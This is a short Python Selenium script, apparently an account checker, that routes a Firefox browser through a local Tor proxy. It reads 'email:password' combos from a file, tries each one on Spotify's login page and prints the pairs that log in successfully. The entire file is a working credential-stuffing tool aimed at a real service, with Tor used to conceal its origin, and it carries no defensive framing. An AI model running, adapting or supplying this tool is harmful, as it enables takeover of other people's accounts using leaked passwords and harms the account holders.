from selenium import webdriver
import re
import time

profile=webdriver.FirefoxProfile()							#
profile.set_preference('network.proxy.type', 1)				#
profile.set_preference('network.proxy.socks', '127.0.0.1')	# Setting Tor
profile.set_preference('network.proxy.socks_port', 9050)	#
browser=webdriver.Firefox(profile)							#

browser.get('https://accounts.spotify.com/')

def getEmailUser(filename): #Get combos (email:password) from a file
	file = open(filename, 'r')
	text = file.read()

	p = re.compile('(.*):(.*)')
	lista = p.findall(text)

	return lista #List with user:pass


def checkAccount(user, passwd):
	time.sleep(2) #Time needed to load the entire page
	form_title = browser.title #Page title to check if user:pass is correct

	username = browser.find_element_by_id('login-username')
	password = browser.find_element_by_id('login-password')
	username.clear()	#Clearing the form
	password.clear()
	username.send_keys(user)	#Sending user
	password.send_keys(passwd)	#Sending password
	browser.find_element_by_tag_name('button').click() #Log in button

	time.sleep(2) #Time needed to load the entire page
	response_title = browser.title#Page title to check if username:pass is correct

	if form_title == response_title:
		return False
	else:
		return True

def logOut():
	browser.find_element_by_tag_name('button').click() #Click log out button
	time.sleep(1) #Time needed to log out
	browser.get('https://accounts.spotify.com/') #Return to login page


#Example use
for user, password in getEmailUser('txt.txt'):
	if checkAccount(user, password) == True:
		print('Valida:', user, password)
		logOut()
	else:
		print('no valida')
